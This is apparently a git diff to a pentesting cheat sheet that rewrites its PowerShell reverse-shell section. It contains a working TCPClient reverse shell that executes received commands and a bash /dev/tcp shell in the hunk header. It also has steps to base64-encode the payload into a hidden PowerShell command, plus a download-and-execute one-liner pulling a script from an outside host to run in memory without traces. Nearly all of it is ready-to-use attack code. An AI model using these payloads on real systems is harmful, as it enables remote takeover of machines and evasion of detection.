@@ -60,37 +60,49 @@ this one works everywhere `exec 5<>/dev/tcp/10.10.14.151/443;cat <&5 | while rea
 
 ## Powershell
 
-This script is tested on most windows machines and should work fine.
+### Encoded Powershell Execution
 
-```
-#replace <IP_ATTACKER> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)
+1. Create `shell_raw.ps1` with following contents
 
 ```powershell
+#replace <IP_ATTACKER> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)
 
 # rev.ps1
 $client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
 
 ```
 
-Launch the above script directly or save on local attacking maching and call it from powershell like that to execute in memory and leave no traces
-
-`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`
-
-`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File shell.ps1`
-
-### Encoded POwershell Execution
+2. Encode contents of  `shell_raw.ps1`
 
 ```powershell
+# using powershell 
 $expression     = Get-Content -Path .\shell_raw.ps1
 $commandBytes   = [System.Text.Encoding]::Unicode.GetBytes($expression)
 $encodedCommand = [Convert]::ToBase64String($commandBytes)
+$filePath = "encoded.ps1"
 
-Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase64String($encodedCommand)))
+$encodedCommand | Out-File -FilePath $filePath  -Encoding ASCII
 
-#or 
+
+# or using python
+
+import sys
+import base64
+
+with open(sys.argv[1], 'r') as file:
+    payload = file.read()
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+```
+3. Execute with powershell the output of $encodedCommand
 
 str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad..."
-```
+
+Or execute in memory
+
+`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`
 
 ## Python
 
